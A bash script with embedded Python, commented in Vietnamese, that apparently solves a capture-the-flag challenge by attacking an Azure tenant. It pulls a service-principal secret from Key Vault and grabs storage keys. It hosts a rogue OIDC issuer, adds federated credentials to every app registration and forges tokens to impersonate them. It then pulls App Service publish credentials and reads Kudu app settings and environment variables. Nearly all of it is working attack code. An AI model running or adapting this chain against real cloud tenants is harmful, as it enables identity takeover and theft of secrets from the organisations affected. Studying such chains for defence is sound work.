#!/usr/bin/env bash
# v15 — custom role tbl-publishing-reader: thử publishxml trên 2 App Service bằng MỌI app,
#       rồi dùng publish credential vào Kudu đọc app settings / env.
set +e
TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
RG=rg-tbl-platform-prod-sea; SA=sttblcilogsprodx3euoz
PROD=kv-tbl-prod-x3euoz
AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514
HOST="https://$SA.z23.web.core.windows.net"
PFX="htx-$RANDOM$RANDOM"; SUBJECT="tbl-solver-htx"

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
ARM0=$(tok_fed "https://management.azure.com/.default" "$GHTOK")
ASEC=$(curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
  | python3 -c "
import sys,json;print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
G=$(tok_sp "$AUTO_APP" "$ASEC" "https://graph.microsoft.com/.default")
ARMA=$(tok_sp "$AUTO_APP" "$ASEC" "https://management.azure.com/.default")
KEY0=$(curl -sS -X POST -H "Authorization: Bearer $ARMA" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
  | python3 -c "
import sys,json;print(json.load(sys.stdin)['keys'][0]['value'])")

echo "================ custom roles ================"
for RN in $(curl -sS -H "Authorization: Bearer $ARM0" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01&\$filter=type+eq+'CustomRole'" \
  | python3 -c "
import sys,json
for r in json.load(sys.stdin).get('value',[]): print(r['name'])"); do
  curl -sS -H "Authorization: Bearer $ARM0" \
    "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/$RN?api-version=2022-04-01" \
    | python3 -c "
import sys,json
d=json.load(sys.stdin)['properties']
print(' ',d['roleName'],json.dumps(d['permissions']),d.get('assignableScopes'))"
done

echo "================ roleAssignments từng resource ================"
for RES in "Microsoft.Web/sites/app-tbl-storefront-prod" "Microsoft.Web/sites/app-tbl-reporting-prod" \
           "Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz" "Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz"; do
  echo "--- $RES"
  curl -sS -H "Authorization: Bearer $ARM0" \
   "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/$RES/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
   | python3 -c "
import sys,json
for a in json.load(sys.stdin).get('value',[]):
    p=a['properties']; print('   ',p['principalId'],p.get('principalType'),p['roleDefinitionId'].split('/')[-1])" 2>/dev/null
done

curl -sS -H "Authorization: Bearer $G" \
  "https://graph.microsoft.com/v1.0/applications?\$top=100&\$select=id,appId,displayName" > /tmp/apps.json

pip -q install azure-storage-blob pyjwt cryptography >/dev/null 2>&1
python3 - "$SA" "$KEY0" "$HOST" "$PFX" "$SUBJECT" "$TEN" "$SUB" "$RG" "$G" <<'PY'
import sys,json,time,uuid,base64,urllib.request,urllib.parse,re
from azure.storage.blob import BlobServiceClient, ContentSettings
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import jwt
sa,key0,host,pfx,subject,ten,sub,rg,graph = sys.argv[1:10]
ISS=f"{host}/{pfx}"; SITES=["app-tbl-storefront-prod","app-tbl-reporting-prod"]
FLAG=re.compile(r'DF26\{[^}]*\}')
svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key0)
web=svc.get_container_client("$web")
priv=rsa.generate_private_key(public_exponent=65537,key_size=2048)
pn=priv.public_key().public_numbers()
b64u=lambda i: base64.urlsafe_b64encode(i.to_bytes((i.bit_length()+7)//8,'big')).decode().rstrip('=')
KID="k-"+uuid.uuid4().hex[:8]
PEM=priv.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption())
JS=json.dumps({"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":KID,"n":b64u(pn.n),"e":b64u(pn.e)}]})
CFG=json.dumps({"issuer":ISS,"jwks_uri":ISS+"/jwks.json","response_types_supported":["id_token"],
 "subject_types_supported":["public"],"id_token_signing_alg_values_supported":["RS256"]})
ct=ContentSettings(content_type="application/json")
for p,b in ((f"{pfx}/jwks.json",JS),(f"{pfx}/.well-known/jwks.json",JS),(f"{pfx}/.well-known/openid-configuration",CFG)):
    web.upload_blob(p,b,overwrite=True,content_settings=ct)

def api(url,method="GET",tok=graph,body=None,raw=False):
    d=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(url,d,method=method,headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(r,timeout=40) as f:
            t=f.read(); return t.decode(errors="replace") if raw else (json.loads(t) if t else {})
    except Exception as e:
        try: return {"error":json.loads(e.read())} if not raw else "ERR"
        except Exception: return {"error":str(e)[:100]} if not raw else "ERR"
def mint():
    n=int(time.time())
    return jwt.encode({"iss":ISS,"sub":subject,"aud":"api://AzureADTokenExchange","iat":n-60,
      "nbf":n-60,"exp":n+900,"jti":uuid.uuid4().hex},PEM,algorithm="RS256",headers={"kid":KID})
def exchange(app,scope):
    d=urllib.parse.urlencode({"client_id":app,"scope":scope,"grant_type":"client_credentials",
      "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":mint()}).encode()
    try:
        with urllib.request.urlopen(urllib.request.Request(
          f"https://login.microsoftonline.com/{ten}/oauth2/v2.0/token",d),timeout=30) as f:
            return json.load(f).get("access_token","")
    except Exception: return ""

apps=json.load(open("/tmp/apps.json"))["value"]
created=[]
for a in apps:
    r=api(f"https://graph.microsoft.com/v1.0/applications/{a['id']}/federatedIdentityCredentials","POST",
          body={"name":"tmp-"+pfx[:12],"issuer":ISS,"subject":subject,"audiences":["api://AzureADTokenExchange"]})
    if "error" not in r: created.append((a['id'],r.get("id"),a['appId'],a['displayName']))
print("[*] FIC tạm:",len(created)); time.sleep(45)

def kudu(site,user,pw):
    import base64 as b
    auth=b.b64encode(f"{user}:{pw}".encode()).decode()
    for path in ("/api/settings","/api/environment"):
        try:
            r=urllib.request.Request(f"https://{site}.scm.azurewebsites.net{path}",
                headers={"Authorization":"Basic "+auth})
            with urllib.request.urlopen(r,timeout=40) as f:
                t=f.read().decode(errors="replace")
            m=FLAG.findall(t)
            print(f"      kudu{path}: {'*** FLAG '+str(m) if m else t[:900]}")
        except Exception as e: print(f"      kudu{path} err",str(e)[:100])

for oid,fid,appid,name in created:
    am=exchange(appid,"https://management.azure.com/.default")
    if not am: continue
    for site in SITES:
        base=f"https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{site}"
        x=api(base+"/publishxml?api-version=2022-03-01","POST",tok=am,body={},raw=True)
        if x!="ERR" and "userName" in x:
            print(f"  >>> {name}: publishxml OK cho {site}")
            m=re.search(r'userName="([^"]+)"[^>]*userPWD="([^"]+)"',x)
            if m: kudu(site,m.group(1),m.group(2))
            f=FLAG.findall(x)
            if f: print("     *** FLAG trong publishxml:",f)
        s=api(base+"/config/appsettings/list?api-version=2022-03-01","POST",tok=am,body={})
        if "error" not in s:
            j=json.dumps(s); f=FLAG.findall(j)
            print(f"  >>> {name}: appsettings {site} =", ("*** FLAG "+str(f)) if f else j[:900])

print("[*] dọn dẹp")
for oid,fid,appid,name in created:
    if fid: api(f"https://graph.microsoft.com/v1.0/applications/{oid}/federatedIdentityCredentials/{fid}","DELETE")
for p in (f"{pfx}/jwks.json",f"{pfx}/.well-known/jwks.json",f"{pfx}/.well-known/openid-configuration"):
    try: web.delete_blob(p)
    except Exception: pass
PY
echo "================ DONE ================"
